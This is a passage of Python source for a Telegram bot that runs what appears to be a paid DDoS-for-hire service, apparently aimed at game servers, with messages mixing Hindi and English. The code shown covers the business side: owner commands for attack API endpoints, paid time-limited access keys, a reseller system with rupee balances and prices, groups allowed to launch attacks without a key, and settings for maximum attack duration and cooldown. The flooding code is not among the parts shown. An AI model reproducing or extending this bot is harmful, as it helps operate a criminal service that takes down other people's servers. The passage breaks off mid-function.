@bot.message_handler(commands=['listapis'])
def list_apis_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    apis = get_api_list()
    if not apis:
        bot.reply_to(message, "📋 Koi API nahi hai!")
        return
    
    response = "═══════════════════════════\n📡 API MANAGEMENT\n═══════════════════════════\n\n"
    response += f"📊 Total APIs: {len(apis)}\n"
    response += f"🟢 Enabled: {len(get_enabled_apis())}\n\n"
    
    for api in apis:
        status = "🟢" if api.get('enabled', True) else "🔴"
        name = api.get('name', f'API-{api["id"]}')
        response += f"{status} ID: {api['id']} | {name}\n"
        response += f"   Usage: {api.get('usage_count', 0)} | Success: {api.get('success_count', 0)} | Fail: {api.get('fail_count', 0)}\n"
        short_url = api['url'][:60] + "..." if len(api['url']) > 60 else api['url']
        response += f"   URL: {short_url}\n\n"
    
    response += "═══════════════════════════\n"
    response += "Commands:\n"
    response += "/addapi <url> [name] - Add API\n"
    response += "/removeapi <id> - Remove API\n"
    response += "/toggleapi <id> - Enable/Disable\n"
    response += "/testapi <id> - Test API\n"
    response += "/listapis - Show all APIs\n"
    response += "/apistats - Show API statistics\n"
    response += "/resetapi [id] - Reset API stats\n"
    response += "═══════════════════════════"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['apistats'])
def api_stats_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    apis = get_api_list()
    if not apis:
        bot.reply_to(message, "📋 Koi API nahi hai!")
        return
    
    total_usage = sum(api.get('usage_count', 0) for api in apis)
    total_success = sum(api.get('success_count', 0) for api in apis)
    total_fail = sum(api.get('fail_count', 0) for api in apis)
    
    response = "═══════════════════════════\n📊 API STATISTICS\n═══════════════════════════\n\n"
    response += f"📈 Total Usage: {total_usage}\n"
    response += f"✅ Success: {total_success}\n"
    response += f"❌ Failed: {total_fail}\n"
    response += f"📊 Success Rate: {round((total_success/total_usage*100) if total_usage > 0 else 0, 2)}%\n\n"
    
    response += "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for api in apis:
        name = api.get('name', f'API-{api["id"]}')
        status = "🟢" if api.get('enabled', True) else "🔴"
        usage = api.get('usage_count', 0)
        success = api.get('success_count', 0)
        fail = api.get('fail_count', 0)
        rate = round((success/usage*100) if usage > 0 else 0, 2)
        response += f"{status} {name}\n"
        response += f"   Uses: {usage} | ✅ {success} | ❌ {fail} | 📊 {rate}%\n\n"
    
    response += "═══════════════════════════"
    bot.reply_to(message, response)

@bot.message_handler(commands=['resetapi'])
def reset_api_stats_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) == 1:
        success, msg = reset_api_stats()
        bot.reply_to(message, f"{'✅' if success else '❌'} {msg}")
    else:
        try:
            api_id = int(parts[1])
            success, msg = reset_api_stats(api_id)
            bot.reply_to(message, f"{'✅' if success else '❌'} {msg}")
        except:
            bot.reply_to(message, "❌ Invalid ID!")

# ============================================================
# ===== REEL MANAGEMENT COMMANDS =====
# ============================================================

@bot.message_handler(commands=['reel_on'])
def reel_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_reel_enabled(True)
    bot.reply_to(message, "✅ Reel feature ENABLED! Har attack ke sath reel bheja jayega.")

@bot.message_handler(commands=['reel_off'])
def reel_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_reel_enabled(False)
    bot.reply_to(message, "✅ Reel feature DISABLED! Sirf text message bheja jayega.")

@bot.message_handler(commands=['addreel'])
def add_reel_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    if not message.reply_to_message:
        bot.reply_to(message, "⚠️ Kisi video message ko reply karke /addreel likho.")
        return
    if message.reply_to_message.video:
        file_id = message.reply_to_message.video.file_id
    elif message.reply_to_message.animation:
        file_id = message.reply_to_message.animation.file_id
    else:
        bot.reply_to(message, "❌ Sirf video ya GIF (animation) add kar sakte ho.")
        return
    if add_reel(file_id):
        count = len(get_reel_list())
        bot.reply_to(message, f"✅ Reel added! Total reels: {count}")
    else:
        bot.reply_to(message, "⚠️ Ye reel pehle se add hai.")

@bot.message_handler(commands=['removereel'])
def remove_reel_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /removereel <index>\nUse /listreels to see indexes.")
        return
    try:
        index = int(parts[1]) - 1
    except:
        bot.reply_to(message, "❌ Invalid index! Number daalo.")
        return
    removed = remove_reel(index)
    if removed:
        bot.reply_to(message, f"✅ Reel #{index+1} remove kar di gayi.")
    else:
        bot.reply_to(message, "❌ Invalid index! Use /listreels to see correct index.")

@bot.message_handler(commands=['listreels'])
def list_reels_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    reels = get_reel_list()
    if not reels:
        bot.reply_to(message, "📋 Koi reel nahi hai. /addreel se add karo.")
        return
    response = "📋 𝗥𝗘𝗘𝗟 𝗟𝗜𝗦𝗧\n\n"
    for i, fid in enumerate(reels, 1):
        response += f"{i}. `{fid[:10]}...`\n"
    response += f"\nTotal: {len(reels)} reels"
    bot.reply_to(message, response, parse_mode="Markdown")

# ============================================================
# ===== BASIC COMMANDS =====
# ============================================================

@bot.message_handler(commands=["verify"])
def verify_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    if not get_channel_required():
        bot.reply_to(message, "ℹ️ Channel join required nahi hai.")
        return
    if user_id == BOT_OWNER or is_reseller(user_id):
        bot.reply_to(message, "✅ Owner/Reseller bypass.")
        return
    not_joined = []
    for channel_username in REQUIRED_CHANNEL_USERNAMES:
        try:
            chat_member = bot.get_chat_member(f"@{channel_username}", user_id)
            if chat_member.status not in ['member', 'administrator', 'creator']:
                not_joined.append(f"@{channel_username}")
        except Exception as e:
            print(f"⚠️ Verify error for {channel_username}: {e}")
            not_joined.append(f"@{channel_username}")
    if not_joined:
        channels_text = "\n".join([f"• {ch}" for ch in not_joined])
        bot.reply_to(message, f"❌ Not joined:\n{channels_text}\n\nJoin then /verify again.")
    else:
        bot.reply_to(message, f"✅ Verified!\n📢 Channel: {', '.join(REQUIRED_CHANNEL_USERNAMES)}")

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    bot.reply_to(message, f"`{message.from_user.id}`", parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    total_users = users_collection.count_documents({})
    maintenance_status = "✅ Disabled" if not is_maintenance() else "🔴 Enabled"
    uptime_seconds = (datetime.now() - bot_start_time).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    channel_status = "✅ Required" if get_channel_required() else "❌ Not Required"
    ddos_status = "✅ ON" if get_ddos_protection() else "❌ OFF"
    approved_count = len(get_approved_groups())
    reel_count = len(get_reel_list())
    reel_status = "✅ ON" if get_reel_enabled() else "❌ OFF"
    api_count = len(get_enabled_apis())
    response = f"🏓 Pong!\n\n• Response: {response_time}ms\n• Status: 🟢 Online\n• Users: {total_users}\n• Maintenance: {maintenance_status}\n• Channel: {channel_status}\n• DDoS: {ddos_status}\n• Groups: {approved_count}\n• Uptime: {uptime_str}\n• Reels: {reel_count} ({reel_status})\n• Max Slots: {api_count}\n\n⚡ Private: Max {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s\n⚡ Groups: Max {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s"
    bot.reply_to(message, response)

# ============================================================
# ===== GEN KEY =====
# ============================================================

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    reseller = get_reseller(user_id)
    
    if is_owner(user_id):
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>\n\nFormat: s/m/h/d\nExample: /gen 1d 1\nBulk: /gen 1d 5")
            return
        duration_str = command_parts[1].lower()
        duration, duration_label = parse_duration(duration_str)
        if not duration:
            bot.reply_to(message, "❌ Invalid format! Use: s/m/h/d")
            return
        try:
            count = int(command_parts[2])
            if count < 1 or count > 50:
                bot.reply_to(message, "❌ Count 1-50 ke beech hona chahiye!")
                return
        except:
            bot.reply_to(message, "❌ Invalid count!")
            return
        generated_keys = []
        for _ in range(count):
            key = f"BGMI-{generate_key(12)}"
            key_doc = {
                'key': key,
                'duration_seconds': int(duration.total_seconds()),
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        if count == 1:
            bot.reply_to(message, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {duration_label}", parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", parse_mode="HTML")
    
    elif reseller:
        if reseller.get('blocked'):
            bot.reply_to(message, "🚫 Aapka panel blocked hai!")
            return
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\n\nExample: /gen 1d 1\nBulk: /gen 1d 5")
            return
        duration_key = command_parts[1].lower()
        if duration_key not in RESELLER_PRICING:
            bot.reply_to(message, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d")
            return
        try:
            count = int(command_parts[2])
            if count < 1 or count > 20:
                bot.reply_to(message, "❌ Count 1-20 ke beech hona chahiye!")
                return
        except:
            bot.reply_to(message, "❌ Invalid count!")
            return
        pricing = RESELLER_PRICING[duration_key]
        price = pricing['price']
        total_price = price * count
        balance = reseller.get('balance', 0)
        if balance < total_price:
            bot.reply_to(message, f"❌ Insufficient balance!\n\n💵 Required: {total_price} Rs ({count} x {price})\n💰 Your Balance: {balance} Rs\n\nBalance add karwao owner se!")
            return
        username = message.from_user.username or str(user_id)
        generated_keys = []
        for _ in range(count):
            key = f"{username}-{generate_key(10)}"
            key_doc = {
                'key': key,
                'duration_seconds': pricing['seconds'],
                'duration_label': pricing['label'],
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_username': username,
                'created_by_type': 'reseller',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        new_balance = balance - total_price
        resellers_collection.update_one({'user_id': user_id}, {'$set': {'balance': new_balance}, '$inc': {'total_keys_generated': count}})
        try:
            keys_list_str = "\n".join([f"<code>{k}</code>" for k in generated_keys])
            owner_msg = (
                "🔔 <b>Reseller Key Notification</b>\n\n"
                f"👤 <b>Reseller:</b> {username} ({user_id})\n"
                f"🔑 <b>Keys Generated:</b> {count}\n"
                f"⏰ <b>Duration:</b> {pricing['label']}\n"
                f"💵 <b>Total Cost:</b> {total_price} Rs\n"
                f"💰 <b>Remaining Balance:</b> {new_balance} Rs\n\n"
                f"📜 <b>Keys:</b>\n{keys_list_str}"
            )
            bot.send_message(BOT_OWNER, owner_msg, parse_mode="HTML")
        except Exception as e:
            print(f"Failed to notify owner: {e}")
        if count == 1:
            bot.reply_to(message, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {pricing['label']}\n💰 Balance: {new_balance} Rs", parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {pricing['label']}\n💵 Cost: {total_price} Rs\n💰 Balance: {new_balance} Rs", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Ye command sirf owner/reseller use kar sakta hai!")

# ============================================================
# ===== RESELLER COMMANDS =====
# ============================================================

@bot.message_handler(commands=["add_reseller"])
def add_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /add_reseller <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    existing = resellers_collection.find_one({'user_id': reseller_id})
    if existing:
        bot.reply_to(message, "❌ Ye user pehle se reseller hai!")
        return
    reseller_doc = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now(),
        'added_by': user_id,
        'blocked': False,
        'total_keys_generated': 0
    }
    resellers_collection.insert_one(reseller_doc)
    try:
        bot.send_message(reseller_id, "🎉 Congratulations! Aap ab Reseller ban gaye ho!\n\n💰 Use /mysaldo to check balance\n🔑 Use /gen to generate keys\n💵 Use /prices to see pricing")
    except:
        pass
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"✅ Reseller added!\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💰 Balance: 0 Rs")

@bot.message_handler(commands=["remove_reseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /remove_reseller <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    result = resellers_collection.delete_one({'user_id': reseller_id})
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.deleted_count > 0:
        bot.reply_to(message, f"✅ Reseller {display} removed!")
    else:
        bot.reply_to(message, "❌ Reseller nahi mila!")

@bot.message_handler(commands=["block_reseller"])
def block_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /block_reseller <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': True}})
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        bot.reply_to(message, f"🚫 Reseller {display} blocked!")
    else:
        bot.reply_to(message, "❌ Reseller nahi mila ya pehle se blocked hai!")

@bot.message_handler(commands=["unblock_reseller"])
def unblock_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unblock_reseller <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': False}})
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        bot.reply_to(message, f"✅ Reseller {display} unblocked!")
    else:
        bot.reply_to(message, "❌ Reseller nahi mila!")

@bot.message_handler(commands=["saldo_add"])
def saldo_add_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /saldo_add <id or @username> <amount>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    try:
        amount = int(command_parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid amount!")
        return
    if amount <= 0:
        bot.reply_to(message, "❌ Amount must be positive!")
        return
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    new_balance = reseller.get('balance', 0) + amount
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    try:
        bot.send_message(reseller_id, f"💰 Balance Added!\n\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs")
    except:
        pass
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"✅ Balance Added!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs")

@bot.message_handler(commands=["saldo_remove"])
def saldo_remove_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /saldo_remove <id or @username> <amount>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    try:
        amount = int(command_parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid amount!")
        return
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    new_balance = max(0, reseller.get('balance', 0) - amount)
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"✅ Balance Removed!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➖ Removed: {amount} Rs\n💵 New Balance: {new_balance} Rs")

@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /saldo <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"💰 Reseller Balance\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys: {reseller.get('total_keys_generated', 0)}\n📊 Status: {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}")

@bot.message_handler(commands=["all_resellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    resellers = list(resellers_collection.find())
    if not resellers:
        bot.reply_to(message, "📋 Koi reseller nahi hai!")
        return
    response = "═══════════════════════════\n👥 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗟𝗜𝗦𝗧\n═══════════════════════════\n\n"
    active_resellers = [r for r in resellers if not r.get('blocked')]
    blocked_resellers = [r for r in resellers if r.get('blocked')]
    response += f"🟢 𝗔𝗖𝗧𝗜𝗩𝗘: {len(active_resellers)}\n───────────────────────────\n"
    for i, r in enumerate(active_resellers[:10], 1):
        response += f"{i}. 👤 `{r['user_id']}`\n   💵 Balance: {r.get('balance', 0)} Rs\n   🔑 Keys: {r.get('total_keys_generated', 0)}\n\n"
    if blocked_resellers:
        response += f"🔴 𝗕𝗟𝗢𝗖𝗞𝗘𝗗: {len(blocked_resellers)}\n───────────────────────────\n"
        for i, r in enumerate(blocked_resellers[:5], 1):
            response += f"{i}. 👤 `{r['user_id']}`\n"
    response += "\n═══════════════════════════"
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    reseller = get_reseller(user_id)
    if not reseller:
        bot.reply_to(message, "❌ Aap reseller nahi ho!")
        return
    if reseller.get('blocked'):
        bot.reply_to(message, "🚫 Aapka panel blocked hai!")
        return
    bot.reply_to(message, f"💰 Your Balance\n\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys Generated: {reseller.get('total_keys_generated', 0)}\n\n📋 Use /prices to see key prices\n🔑 Use /gen <duration> to generate key", parse_mode="Markdown")

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf resellers ke liye hai!")
        return
    update_reseller_pricing()
    response = "═══════════════════════════\n💵 𝗞𝗘𝗬 𝗣𝗥𝗜𝗖𝗜𝗡𝗚\n═══════════════════════════\n\n"
    durations = ['12h', '1d', '3d', '7d', '30d', '60d']
    for dur in durations:
        if dur in RESELLER_PRICING:
            info = RESELLER_PRICING[dur]
            response += f"🔴 {info['label']:<9} ➜  {info['price']} Rs\n"
    response += "\n═══════════════════════════\n📋 Usage: /gen <duration> <count>\nExample: /gen 1d 1\n═══════════════════════════"
    bot.reply_to(message, response)

# ============================================================
# ===== PROTECTION TOGGLES =====
# ============================================================

@bot.message_handler(commands=["ddos_on"])
def ddos_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_ddos_protection(True)
    protection.enabled = True
    bot.reply_to(message, "✅ DDoS Protection: ENABLED\n\nRate limit: 30 req/sec\nUser limit: 5 req/5 sec")

@bot.message_handler(commands=["ddos_off"])
def ddos_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_ddos_protection(False)
    protection.enabled = False
    bot.reply_to(message, "❌ DDoS Protection: DISABLED\n\nAll rate limits removed!")

@bot.message_handler(commands=["required_on"])
def required_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_channel_required(True)
    bot.reply_to(message, "✅ Channel join REQUIRED now!\n\nUsers must join @DESTROYDDOSLODER to attack.")

@bot.message_handler(commands=["required_off"])
def required_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_channel_required(False)
    bot.reply_to(message, "✅ Channel join NOT required now!\n\nUsers can attack without joining any channel.")

@bot.message_handler(commands=["addgrp"])
def add_group_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /addgrp <group_id>\n\nExample: /addgrp -1001234567890")
        return
    try:
        group_id = int(command_parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid group ID!")
        return
    if add_approved_group(group_id):
        bot.reply_to(message, f"✅ Group Approved!\n\n📢 Group ID: `{group_id}`\n\nNow all members can attack in this group without key!\n⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔢 Max Slots: {len(get_enabled_apis())}", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"ℹ️ Group `{group_id}` already approved!", parse_mode="Markdown")

@bot.message_handler(commands=["removegrp"])
def remove_group_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /removegrp <group_id>")
        return
    try:
        group_id = int(command_parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid group ID!")
        return
    if remove_approved_group(group_id):
        bot.reply_to(message, f"✅ Group Removed!\n\n📢 Group ID: `{group_id}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"❌ Group `{group_id}` not found!", parse_mode="Markdown")

@bot.message_handler(commands=["groups"])
def groups_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    approved = get_approved_groups()
    response = "═══════════════════════════\n📢 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n═══════════════════════════\n\n"
    response += f"⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔑 Key Required: ❌ NO\n🔢 Max Slots: {len(get_enabled_apis())}\n\n"
    if approved:
        response += f"📊 Total: {len(approved)}\n\n"
        for i, gid in enumerate(approved, 1):
            response += f"{i}. `{gid}`\n"
    else:
        response += "❌ No groups approved!\n"
    response += "\n═══════════════════════════\nCommands:\n• /addgrp <id>\n• /removegrp <id>"
    bot.reply_to(message, response, parse_mode="Markdown")

# ============================================================
# ===== SETTINGS COMMANDS =====
# ============================================================

@bot.message_handler(commands=["private_max"])
def private_max_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_private_max_attack_time()
        bot.reply_to(message, f"⚙️ Current Private Max Attack Time: {current}s\n\nChange: /private_max <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 10 or new_value > 600:
            bot.reply_to(message, "❌ Value 10-600 seconds ke beech hona chahiye!")
            return
        set_setting('private_max_attack_time', new_value)
        bot.reply_to(message, f"✅ Private Max Attack Time set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["group_max"])
def group_max_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_group_max_attack_time()
        bot.reply_to(message, f"⚙️ Current Group Max Attack Time: {current}s\n\nChange: /group_max <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 10 or new_value > 300:
            bot.reply_to(message, "❌ Value 10-300 seconds ke beech hona chahiye!")
            return
        set_setting('group_max_attack_time', new_value)
        bot.reply_to(message, f"✅ Group Max Attack Time set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["private_cooldown"])
def private_cooldown_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_private_cooldown()
        bot.reply_to(message, f"⏳ Current Private Cooldown: {current}s\n\nChange: /private_cooldown <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 0 or new_value > 3600:
            bot.reply_to(message, "❌ Value 0-3600 seconds ke beech hona chahiye!")
            return
        set_setting('private_cooldown', new_value)
        bot.reply_to(message, f"✅ Private Cooldown set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["group_cooldown"])
def group_cooldown_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_group_cooldown()
        bot.reply_to(message, f"⏳ Current Group Cooldown: {current}s\n\nChange: /group_cooldown <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 0 or new_value > 3600:
            bot.reply_to(message, "❌ Value 0-3600 seconds ke beech hona chahiye!")
            return
        set_setting('group_cooldown', new_value)
        bot.reply_to(message, f"✅ Group Cooldown set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["settings"])
def settings_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    response = "═══════════════════════════════════════\n⚙️ 𝗕𝗢𝗧 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\n═══════════════════════════════════════\n\n"
    response += "📱 𝗣𝗥𝗜𝗩𝗔𝗧𝗘\n• Max Time: {}s\n• Cooldown: {}s\n• Key: ✅ YES\n• DDoS: {}\n• Channel: {}\n\n".format(
        get_private_max_attack_time(),
        get_private_cooldown(),
        '✅ ON' if get_ddos_protection() else '❌ OFF',
        '✅ Required' if get_channel_required() else '❌ Not Required'
    )
    response += "👥 𝗚𝗥𝗢𝗨𝗣\n• Max Time: {}s\n• Cooldown: {}s\n• Key: ❌ NO\n• DDoS: {}\n• Channel: {}\n• Groups: {}\n\n".format(
        get_group_max_attack_time(),
        get_group_cooldown(),
